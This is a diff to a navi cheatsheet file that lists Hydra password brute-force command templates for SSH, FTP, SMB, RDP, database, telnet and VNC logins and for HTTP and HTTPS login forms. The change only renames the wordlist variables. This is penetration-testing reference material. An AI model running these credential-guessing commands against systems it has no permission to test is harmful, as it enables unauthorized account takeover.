@@ -1,23 +1,23 @@
 % web, hydra, ssh, ftp, smb, rdp, mysql, postgres, telnet, vnc
-@ web-variables
+@ hashcracking-variables
 ; From https://github.com/sealldeveloper/navi-cheats/
 
 # Typical brute force attack
-hydra -l <username> -P <seclistdir>/<seclistlist> <protocol>://<target>
+hydra -l <username> -P <passseclistdir>/<passseclistlist> <protocol>://<target>
 
 $ protocol: echo -e "ssh\nftp\nsmb\nrdp\nmysql\npostgres\ntelnet\nvnc\n"
 
 % hydra, http-post
 # HTTP POST form brute force
-hydra -l <username> -P <seclistdir>/<seclistlist> <target> http-post-form "<endpoint>:username=^USER^&password=^PASS^:F=incorrect"
+hydra -l <username> -P <passseclistdir>/<passseclistlist> <target> http-post-form "<endpoint>:username=^USER^&password=^PASS^:F=incorrect"
 
 % hydra, http-get
 # HTTP GET form brute force 
-hydra -l <username> -P <seclistdir>/<seclistlist> <target> http-get-form "<endpoint>:username=^USER^&password=^PASS^:F=Error"
+hydra -l <username> -P <passseclistdir>/<passseclistlist> <target> http-get-form "<endpoint>:username=^USER^&password=^PASS^:F=Error"
 
 % hydra, https-post
 # HTTPS POST form brute force
-hydra -l <username> -P <seclistdir>/<seclistlist> <target> https-post-form "<endpoint>:username=^USER^&password=^PASS^:F=incorrect"
+hydra -l <username> -P <passseclistdir>/<passseclistlist> <target> https-post-form "<endpoint>:username=^USER^&password=^PASS^:F=incorrect"
 
 % hydra, restore
 # Restore previous session
